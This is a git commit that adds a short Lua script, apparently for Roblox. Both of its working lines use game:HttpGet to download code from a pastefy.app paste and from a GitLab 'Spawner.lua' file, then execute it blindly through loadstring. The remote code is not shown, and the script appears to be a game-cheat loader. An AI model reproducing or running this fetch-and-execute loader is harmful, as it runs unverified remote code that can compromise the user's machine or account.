a373216acf69383794d82b148895a2c0e2e27a2c
fornamess <Romanpostik123@gmail.com>
2025-09-03 11:57:29 +0500

    Create gg.lua

---
+++ gg.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/sXu6V30N/raw"))()
+
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
